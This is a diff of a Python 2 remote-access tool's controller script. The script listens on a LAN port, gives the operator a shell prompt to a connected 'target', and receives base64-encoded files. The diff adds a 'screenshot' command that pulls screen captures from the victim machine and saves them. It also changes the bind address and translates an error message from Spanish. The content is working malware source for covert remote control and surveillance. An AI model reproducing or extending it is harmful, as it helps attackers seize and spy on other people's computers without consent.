@@ -6,6 +6,7 @@ import base64
 
 def shell(): 
     current_dir = target.recv(1024)
+    count = 0
     while True:
         comando = raw_input("{}-#: ".format(current_dir))
         if comando == "exit":
@@ -28,7 +29,18 @@ def shell():
                 with open(res[7:],'rb') as file_upload:
                     target.send(base64.b64encode(datos))
             except:
-                print("Ocurrio un error en la subida del archivo...")
+                print("A file upload error has ocurred")
+        elif comando[:10] == "screenshot":
+            target.send(comando)
+            with open("monitor-%d.png" % count,'wb') as screen:
+                datos = target.recv(1024000) 
+                data_decode = base64.b64decode(datos)
+                if data_decode == "fail":
+                    print("Couldn't take the screenshot")
+                else:
+                    screen.write(data_decode)
+                    print("Screenshot taken successfully")
+                    count += 1
         else:
             target.send(comando)
             res = target.recv(1024)
@@ -36,7 +48,6 @@ def shell():
                 continue
             else: 
                 print(res)
-
 
 def upServer():
 
@@ -46,7 +57,7 @@ def upServer():
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-    server.bind(('192.168.0.8', 7777))
+    server.bind(('192.168.0.2', 7777))
     server.listen(1)
 
     print("Server running and waiting for connections...")
